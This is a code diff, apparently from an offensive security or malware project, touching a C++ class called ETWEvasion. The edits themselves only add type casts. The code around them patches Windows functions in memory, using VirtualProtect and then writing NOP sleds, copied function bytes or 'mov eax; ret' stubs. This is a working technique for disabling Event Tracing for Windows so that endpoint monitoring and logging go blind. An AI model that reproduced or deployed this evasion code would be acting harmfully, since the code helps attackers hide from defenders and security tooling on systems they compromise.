@@ -198,15 +198,15 @@ bool ETWEvasion::PatchFunction(FARPROC originalFunc, FARPROC newFunc, size_t pat
     
     // Change memory protection
     DWORD oldProtect;
-    if (!VirtualProtect(originalFunc, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+    if (!VirtualProtect(reinterpret_cast<LPVOID>(originalFunc), patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         return false;
     }
     
     // Write patch
-    memcpy(originalFunc, newFunc, patchSize);
+    memcpy(reinterpret_cast<void*>(originalFunc), reinterpret_cast<const void*>(newFunc), patchSize);
     
     // Restore protection
-    VirtualProtect(originalFunc, patchSize, oldProtect, &oldProtect);
+    VirtualProtect(reinterpret_cast<LPVOID>(originalFunc), patchSize, oldProtect, &oldProtect);
     
     return true;
 }
@@ -215,9 +215,9 @@ void ETWEvasion::CreateNopPatch(FARPROC targetFunc, size_t size) {
     if (!targetFunc || size == 0) return;
     
     DWORD oldProtect;
-    if (VirtualProtect(targetFunc, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
-        memset(targetFunc, 0x90, size); // NOP instruction
-        VirtualProtect(targetFunc, size, oldProtect, &oldProtect);
+    if (VirtualProtect(reinterpret_cast<LPVOID>(targetFunc), size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        memset(reinterpret_cast<void*>(targetFunc), 0x90, size); // NOP instruction
+        VirtualProtect(reinterpret_cast<LPVOID>(targetFunc), size, oldProtect, &oldProtect);
     }
 }
 
@@ -225,7 +225,7 @@ void ETWEvasion::CreateReturnPatch(FARPROC targetFunc, ULONG returnValue) {
     if (!targetFunc) return;
     
     DWORD oldProtect;
-    if (VirtualProtect(targetFunc, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
+    if (VirtualProtect(reinterpret_cast<LPVOID>(targetFunc), 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
         // Create a simple return patch
         // mov eax, returnValue; ret
         uint8_t patch[] = {
@@ -236,8 +236,8 @@ void ETWEvasion::CreateReturnPatch(FARPROC targetFunc, ULONG returnValue) {
             0xC3 // ret
         };
         
-        memcpy(targetFunc, patch, sizeof(patch));
-        VirtualProtect(targetFunc, 8, oldProtect, &oldProtect);
+        memcpy(reinterpret_cast<void*>(targetFunc), patch, sizeof(patch));
+        VirtualProtect(reinterpret_cast<LPVOID>(targetFunc), 8, oldProtect, &oldProtect);
     }
 }
 
